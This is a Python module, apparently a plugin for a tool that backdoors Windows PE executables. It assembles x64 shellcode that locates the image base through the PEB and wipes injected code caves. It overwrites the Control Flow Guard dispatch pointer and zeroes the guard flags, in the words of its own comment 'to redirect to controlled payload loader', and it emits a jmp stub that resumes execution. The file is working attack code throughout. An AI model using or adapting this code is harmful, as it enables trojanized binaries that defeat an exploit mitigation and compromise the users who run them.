from capstone import *
import struct
import random
import logging
import os
import io
logger = logging.getLogger(__name__)


class cfg_core:

    def __init__(self, BDF=None):
        self.BDF = BDF    
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "cfg_core"
        self.description = """Supports CFG patching"""
        self.requirements = {}

    def clean_caves_stub(self, CavesToFix):
        stub = bytes("\x48\x31\xC0"                     # xor rax,rax
                "\x48\x31\xC9"                          # xor rcx,rcx
                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                "\x48\x89\xCB"                          # mov rbx,rcx
                , 'iso-8859-1')
        for cave, values in CavesToFix.items():
            stub += b"\x48\xbf"                          # mov rdi, value below
            stub += struct.pack("<Q", values[0])
            stub += b"\x48\x01\xDF"                      # add rdi, rbx
            stub += b"\x48\xb9"                          # mov rcx, value below
            stub += struct.pack("<Q", values[1])
            stub += b"\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
        return stub

    def assign_cfg_ptr(self):
        self.BDF.patch_instr[self.BDF.pe_object['LCD_CFG_dispatch_fptr_LOC']] = struct.pack("<Q", self.BDF.pe_object['txt_vrt_slck_loc'])
        # LOL Zero out CFG FLAGS to redirect to controlled payload loader
        self.BDF.patch_instr[self.BDF.pe_object['LCD_CFG_Guard_Flags_LOC']] = struct.pack('<I', 0x0)

    def resume_execution_cfg(self):

        resumeExe = b'\xff\xe0'

        return resumeExe
